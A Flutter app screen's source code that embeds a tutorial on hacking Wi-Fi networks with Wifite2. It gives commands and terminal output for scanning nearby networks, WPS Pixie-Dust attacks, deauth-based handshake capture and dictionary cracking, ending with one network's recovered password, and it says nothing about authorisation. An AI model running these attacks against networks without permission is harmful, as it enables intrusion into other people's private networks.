import 'package:flutter/material.dart';
import 'package:hackerstudiopro/network/network_main.dart';

class NetworkEight extends StatefulWidget {
  @override
  _NetworkEightState createState() => _NetworkEightState();
}

class _NetworkEightState extends State<NetworkEight> {
  var text = '''
  There are many ways to attack a Wi-Fi network. The type of encryption, manufacturer settings, and the number of clients connected all dictate how easy a target is to attack and what method would work best. Wifite2 is a powerful tool that automates Wi-Fi hacking, allowing you to select targets in range and let the script choose the best strategy for each network.

Wifite2 follows a simple but effective workflow for hacking nearby networks as rapidly as possible. To do so, it pushes each tactic it tries to the practical limit, even going to far as to try to crack any handshakes it retrieves.

In the first step, Wifite2 scans across all channels looking for any network in range. It ranks these networks it discovers by signal strength, as a network being detected does not ensure you can reliably communicate with it.

Organized from strongest to weakest signal strength, the reconnaissance phase involves gathering information about what networks are around and which hacking techniques they might be vulnerable to. Because of the way Wifite2 is organized, it's easy to add a directional Wi-Fi antenna to use Wifite2 to locate the source of any nearby Wi-Fi network while performing a site survey.

After the site survey is complete, any targets displayed will show whether there are clients connected, whether the network advertises WPS, and what kind of encryption the network is using. Based on this, an attacker can select any target, a group of targets, or all targets to begin an attack based on the information gathered.

Wifite2 will progress through the target list starting with fastest and easiest attacks, like WPS-Pixie, which can result in a password being breached in seconds, on to less sure tactics like checking for weak passwords with a dictionary attack. If an attack fails or takes too long, Wifite2 will move on to the next applicable attack without wasting hours like its predecessor was prone to doing.

What You'll Need

To get started, you'll need a Wi-Fi network adapter you can put into wireless monitor mode. This means selecting one that is compatible with Kali Linux, which we have several excellent guides on doing.

Wifite2 is installed by default on Kali Linux, so I recommend you either use Kali in a virtual machine or dual-booted on a laptop. You can use Wifite2 on other Linux systems, but I won't go through the installation as this guide assumes you're using Kali Linux.

STEP 1: Install Wifite2

If you don't have Wifite2 installed on your system already, you can do so from the GitHub repository. First, you can clone the repository by opening a terminal window and typing the following commands.

	git clone https://github.com/derv82/wifite2.git
	cd wifite2
	sudo python setup.py install

This should download and install Wifite2 on your system. To test if it worked, you can type wifite -h to see information about the version installed.	

  ''';

  var text1 = '''
  STEP 2: Plug in Your Wi-Fi Card

With Wifite2 installed on your system, you'll need to plug in your Kali Linux-compatible wireless network adapter. Wifite2 takes care of not only auto-selecting a wireless network adapter to use but also puts that wireless card into monitor mode for you, meaning you don't need to do anything after plugging in the adapter.

STEP 3: Set Flags & Find a Target

If we know what channel we're attacking on, we can select it by adding the -c command followed by the channel number. Other than that, running Wifite2 is as simple as typing wifite and letting the script gather information.

wifite -c 11

  .               .
.´  ·  .     .  ·  `.  wifite 2.1.6
:  :  :  (¯)  :  :  :  automated wireless auditor
`.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
  `     /¯¯¯\     ´

 [+] option: scanning for targets on channel 11
 [!] conflicting process: NetworkManager (PID 464)
 [!] conflicting process: wpa_supplicant (PID 729)
 [!] conflicting process: dhclient (PID 13595)
 [!] if you have problems: kill -9 PID or re-run wifite with --kill)

 [+] looking for wireless interfaces

    Interface   PHY   Driver              Chipset
-----------------------------------------------------------------------
 1. wlan0       phy3  ath9k_htc           Atheros Communications, Inc. AR9271 802.11n

 [+] enabling monitor mode on wlan0... enabled wlan0mon

   NUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT
   ---  -------------------------  ---  ----  -----  ----  ------
     1              Suicidegirls    11   WPA   48db    no
     2      Bourgeois Pig Guest     11   WPA   45db    no
     3                     BPnet    11   WPA   42db    no
     4      DirtyLittleBirdyFeet    11   WPA   32db    no    5
     5                ATT73qDwuI    11   WPA   32db   yes
     6               SpanishWiFi    11   WPA   24db    no
     7            Franklin Lower    11   WPA   20db    no    3
     8                     Sonos    11   WPA   11db    no
     9            Villa Carlotta    11   WPA   11db    no
    10                     Sonos    11   WPA   10db    no
 [+] select target(s) (1-10) separated by commas, dashes or all:


Here, we executed a scan on channel 11 and found 10 different targets. Of those targets, two have clients connected, one has WPS enabled, and all are using WPA security.

STEP 4: Examine the Site Survey & Choose Targets

From our test survey, we can see that target number 5 may present the best target. While the signal strength isn't the best, and there aren't any clients connected, we can probably get a handshake with the new PMKID attack even if no one is connected.

If we're looking for weak passwords, the first three networks have the strongest signal strength, while targets 4 and 7 have the best chance of scoring a quick four-way handshake to try brute-forcing later. If we're targeting a particular network, now is when we can select it. If we want to pick the most likely networks, we might select targets 4, 5, and 7 for the likelihood of a fast handshake being captured and cracked, if the WPS PIN isn't cracked first.

If we want to focus on easy targets, we can tell the script to only display targets vulnerable to a certain kind of attack. To show only targets with WPS that might be vulnerable to Reaver or Bully attacks, we can run Wifite2 with the -wps flag.

wifite -wps

  .               .
.´  ·  .     .  ·  `.  wifite 2.1.6
:  :  :  (¯)  :  :  :  automated wireless auditor
`.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
  `     /¯¯¯\     ´


We can do the same with -wpa or -wep to only show targets matching these types of encryption.

STEP 5: Automate Attacks by Target Type

From our results list, let's select a target with both WPS enabled and clients attached. After selecting the number of the network we wish to attack, Wifite2 will proceed through the most expedient attacks against the network.

[+] (1/1) starting attacks against 69:96:43:69:D6:96 (The Daily Planet)
 [+] The Daily Planet (76db) WPS Pixie-Dust: [--78s] Failed: Timeout after 300 seconds
 [+] The Daily Planet (52db) WPA Handshake capture: Discovered new client: C8:E0:EB:45:CD:45
 [+] The Daily Planet (35db) WPA Handshake capture: Listening. (clients:1, deauth:11s, timeout:7m59s)

 [+] successfully captured handshake
 [+] saving copy of handshake to hs/handshake_TheDailyPlanet_69:96:43:69:D6:96_2018-12-24T00-33-18.cap saved

 [+] analysis of captured handshake file:
 [+]   tshark: .cap file contains a valid handshake for 69:96:43:69:D6:96
 [!]    pyrit: .cap file does not contain a valid handshake
 [+] cowpatty: .cap file contains a valid handshake for (The Daily Planet)
 [+] aircrack: .cap file contains a valid handshake for 69:96:43:69:D6:96

 [+] Cracking WPA Handshake: Using aircrack-ng via common.txt wordlist

 [!] Failed to crack handshake: common.txt did not contain password
 [+] Finished attacking 1 target(s), exiting


Here, we can see that while the WPS-Pixie attack failed, we were able to easily grab and attack a handshake. The WPS-Pixie attack timed out pretty quickly, so we wasted a minimum of time exploring this avenue of attack. Sometimes, different wireless cards work better with different scripts, and this is true with Reaver and Bully. If one isn't working for you, try the other.

Wifite2 uses Reaver by default, but you can change this to Bully by using the -bully flag.


wifite -wps -bully

  .               .
.´  ·  .     .  ·  `.  wifite 2.1.6
:  :  :  (¯)  :  :  :  automated wireless auditor
`.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
  `     /¯¯¯\     ´


STEP 6: Skip & Examine Results

If Wifite2 is taking too long on any particular attack, we can always skip the current attack by pressing Ctrl-C to bring up a menu that asks if we'd like to continue. Here, you can skip to the next attack by pressing c, or type s to stop Wifite2.

[+] SBG6580E8 (47db) WPS Pixie-Dust: [4m52s] Trying PIN 12523146 (DeAuth:Timeout) (Timeouts:15)
 [!] interrupted

 [+] 1 attack(s) remain, do you want to continue?
 [+] type c to continue or s to stop:

If we're only able to get a four-way handshake, then we may want to add a custom dictionary list of password guesses to try and crack the handshake. We can do this by setting the --dict flag to set the file containing passwords for cracking, the default being set to /usr/share/wordlists/fern-wifi/common.txt. This password list contains many common passwords, but you'll want to use your own if you're serious about getting results.

Below, we successfully decrypt a captured handshake by using a custom dictionary "passwords.txt."


wifite -wpa --dict ./passwords.txt

  .               .
.´  ·  .     .  ·  `.  wifite 2.1.6
:  :  :  (¯)  :  :  :  automated wireless auditor
`.  ·  ` /¯\ ´  ·  .´  https://github.com/derv82/wifite2
  `     /¯¯¯\     ´

 [+] option: using wordlist ./passwords.txt to crack WPA handshakes
 [+] option: targeting WPA-encrypted networks
 [!] conflicting process: NetworkManager (PID 419)
 [!] conflicting process: wpa_supplicant (PID 585)
 [!] conflicting process: dhclient (PID 7902)
 [!] if you have problems: kill -9 PID or re-run wifite with --kill)

 [+] looking for wireless interfaces
     using interface wlan0mon (already in monitor mode)
     you can specify the wireless interface using -i wlan0

   NUM                      ESSID   CH  ENCR  POWER  WPS?  CLIENT
   ---  -------------------------  ---  ----  -----  ----  ------
     1              Suicidegirls    11   WPA   58db   n/a
     2      Bourgeois Pig Guest     11   WPA   56db   n/a
     3                     BPnet    11   WPA   56db   n/a
     4          The Daily Planet     1   WPA   49db   n/a    1
     5                 SBG6580E8     1   WPA   49db   n/a
     6            Hyla Hair 2.4G     8   WPA   48db   n/a
     7         TWCWiFi-Passpoint     1   WPA   46db   n/a
     8  HP-Print-B9-Officejet...     1   WPA   40db   n/a
     9            birds-Wireless     2   WPA   39db   n/a
    10               SpanishWiFi    11   WPA   38db   n/a
 [!] Airodump exited unexpectedly (Code: 0) Command: airodump-ng wlan0mon -a -w /tmp/wifitei_l5H1/airodump --write-interval 1 --output-format pcap,csv
 [+] select target(s) (1-10) separated by commas, dashes or all: 2

 [+] (1/1) starting attacks against DE:F2:86:EC:CA:A0 (Bourgeois Pig Guest )
 [+] Bourgeois Pig Guest  (57db) WPA Handshake capture: Discovered new client: F0:D5:BF:BD:D5:2B
 [+] Bourgeois Pig Guest  (58db) WPA Handshake capture: Discovered new client: 6C:8D:C1:A8:E4:E9
 [+] Bourgeois Pig Guest  (59db) WPA Handshake capture: Listening. (clients:2, deauth:14s, timeout:8m1s)

 [+] successfully captured handshake
 [+] saving copy of handshake to hs/handshake_BourgeoisPigGuest_DE-F2-86-EC-CA-A0_2018-12-24T01-40-28.cap saved

 [+] analysis of captured handshake file:
 [+]   tshark: .cap file contains a valid handshake for de:f2:86:ec:ca:a0
 [!]    pyrit: .cap file does not contain a valid handshake
 [+] cowpatty: .cap file contains a valid handshake for (Bourgeois Pig Guest )
 [+] aircrack: .cap file contains a valid handshake for DE:F2:86:EC:CA:A0

 [+] Cracking WPA Handshake: Using aircrack-ng via passwords.txt wordlist
 [+] Cracking WPA Handshake: 100.00% ETA: 0s @ 2234.0kps (current key: christmasham)
 [+] Cracked WPA Handshake PSK: christmasham

 [+]   Access Point Name: Bourgeois Pig Guest
 [+]  Access Point BSSID: DE:F2:86:EC:CA:A0
 [+]          Encryption: WPA
 [+]      Handshake File: hs/handshake_BourgeoisPigGuest_DE-F2-86-EC-CA-A0_2018-12-24T01-40-28.cap
 [+]      PSK (password): christmasham
 [+] saved crack result to cracked.txt (1 total)
 [+] Finished attacking 1 target(s), exiting

By adding a good password file, we can improve our chances of cracking a Wi-Fi network password even if the faster WPS attacks fail.
  ''';
 @override
  Widget build(BuildContext context) {
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Stack(
        children: <Widget>[
          Container(
            // Here the height of the container is 45% of our total height
            height: size.height * .45,
            decoration: BoxDecoration(
              color: Color(0xFFF5CEB8),
              image: DecorationImage(
                alignment: Alignment.centerLeft,
                image: AssetImage("assets/images/undraw_pilates_gpdb.png"),
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: <Widget>[
                Align(
                  alignment: Alignment.topLeft,
                  child: GestureDetector(
                    onTap: () => Navigator.pushReplacement(context,
                        MaterialPageRoute(builder: (context) => NetworkMain())),
                    child: Container(
                      alignment: Alignment.center,
                      height: 52,
                      width: 52,
                      decoration: BoxDecoration(
                        color: Color(0xFFF2BEA1),
                        // color:Colors.orange,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(Icons.arrow_back_ios, color: Colors.white),
                    ),
                  ),
                ),
                Text("Automate Wi-Fi Hacking with Wifite2",
                    style: TextStyle(
                        fontSize: 30,
                        color: Colors.grey,
                        fontWeight: FontWeight.bold)),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: ListView(
                      children: <Widget>[
                        Text(
                          text,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/wite.png')),
                        Text(
                          text1,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        
                        RaisedButton(
                          child: Text(
                              "Follow me on Social Media if you have Questions"),
                          onPressed: () {
                            followMe();
                          },
                          color: Color(0xFFF2BEA1),
                        )
                      ],
                    ),
                  ),
                )
              ],
            ),
          )
        ],
      ),
    );
  }

  void followMe() {
    showDialog(
        context: context,
        builder: (context) {
          return AlertDialog(
            backgroundColor: Color(0xFFF5CEB8),
            title: Text('Follow me'),
            content: Text("Twitter: @Millime64755564"),
            actions: <Widget>[
              FlatButton(
                  onPressed: () => Navigator.pop(context), child: Text('Exit'))
            ],
          );
        });
  }
}
